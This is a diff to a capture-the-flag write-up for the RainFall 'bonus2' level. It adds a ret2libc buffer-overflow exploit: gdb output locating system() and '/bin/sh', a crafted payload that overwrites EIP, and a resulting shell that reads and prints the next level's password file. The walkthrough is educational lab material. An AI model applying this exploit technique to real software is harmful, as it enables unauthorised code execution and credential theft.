@@ -324,13 +324,13 @@ Stopped reason: SIGSEGV
 
 Visibly buffer offset is 18
 
-## Where to go next
+## exploit
 
 We have asserted the respective offsets of the buffer for each case of the execution ("fi" and default "en").
 
 We know that the EIP is overwritten only when the Greeting Message is of length 13 (either "fi" or "nl").
 
-Now we know 
+So we can now decide how to exploit the binary. Since we know that the program will crash with an input of length 14 or above. 
 
 ```shell-session
 bonus2@RainFall:~$ LANG="fi" ./bonus2 $(python -c "print '\x90'*40")
@@ -339,4 +339,36 @@ Hyvää päivää hellooooooooo
 bonus2@RainFall:~$ LANG="fi" ./bonus2 $(python -c "print '\x90'*40") helloooooooooo
 Hyvää päivää helloooooooooo
 Segmentation fault (core dumped)
+```
+
+Since we can overwrite EIP with any address we see fit we could either:
+- make it point to a shellcode in the environment
+- make it point to the address of `system(/bin/sh)` 
+
+Lets try the latter:
+- address of `system`: 
+   ```gdb
+   gdb-peda$ info function system
+   All functions matching regular expression "system":
+
+   Non-debugging symbols:
+   0xb7e6b060  __libc_system
+   0xb7e6b060  system
+   0xb7f49550  svcerr_systemerr
+   ```
+- address of `/bin/sh`:
+   ```gdb
+   gdb-peda$ find "/bin/sh" 0xb7e2c000 0xb7fd2000
+   Searching for '/bin/sh' in range: 0xb7e2c000 - 0xb7fd2000
+   Found 1 results, display max 1 items:
+   libc : 0xb7f8cc58 ("/bin/sh")
+   ```
+
+## payload
+
+```shell-session
+bonus2@RainFall:~$ LANG=fi ./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 18 + '\x60\xb0\xe6\xb7'+'BYTE'+'\x58\xcc\xf8\xb7'")
+Hyvää päivää `�YTEX�
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 ```
